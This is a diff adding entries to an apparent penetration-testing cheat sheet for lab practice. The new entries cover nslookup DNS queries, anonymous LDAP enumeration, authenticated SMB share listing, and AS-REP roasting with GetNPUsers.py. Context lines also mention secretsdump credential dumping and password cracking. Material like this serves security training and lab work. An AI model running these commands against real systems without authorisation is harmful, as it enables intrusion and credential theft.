@@ -32,6 +32,11 @@ john hash --wordlist=/opt/wordlists/rockyou.txt
 ```
 dig axfr [DOMAIN].[TLD] @[IP_ADDR]
 dig @[IP_ADDR] -x [IP_ADDR]
+nslookup [IP_ADDR]
+> server
+> 127.0.0.1
+> 127.0.0.2
+> [IP_ADDR]
 ```
 
 ### HTTP (80) / HTTPS (443)
@@ -83,6 +88,7 @@ smbmap -H [IP_ADDR] -u [USERNAME]
 lookupsid.py anonymous@$[IP_ADDR]   # with IPC$ readonly permission
 secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP_ADDR]   # with ADMIN$ write permission
 crackmapexec smb [IP_ADDR] --shares
+crackmapexec smb [IP_ADDR] -u [USERNAME] -p [PASSWORD] --shares
 ```
 MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server 2008, 2012, 2016
 SMB share folder mounting
@@ -92,6 +98,16 @@ mount -t cifs -o username=[USERNAME] //[IP_ADDR]/[SHARED_PATH] /mnt/[FOLDER_NAME
 ```
 Mounting VHD file
 Ref: https://www.how2shout.com/linux/mount-virtual-hard-disk-vhd-file-ubuntu-linux/
+
+## LDAP (636)
+```
+ldapsearch -h [IP_ADDR] -x
+ldapsearch -h [IP_ADDR] -x -s base namingcontexts
+ldapsearch -h [IP_ADDR] -x -b "DC=htb DC=local"
+ldapsearch -h [IP_ADDR] -x -b "DC=htb DC=local" '(objectClass=Person)'
+ldapsearch -h [IP_ADDR] -x -b "DC=htb DC=local" '(objectClass=Person)' sAMAccountName |grep sAMAccountName
+python GetNPUsers.py -dc-ip [IP_ADDR] -request 'htb.local/' -format hashcat
+```
 
 ### Rsync (873)
 ```
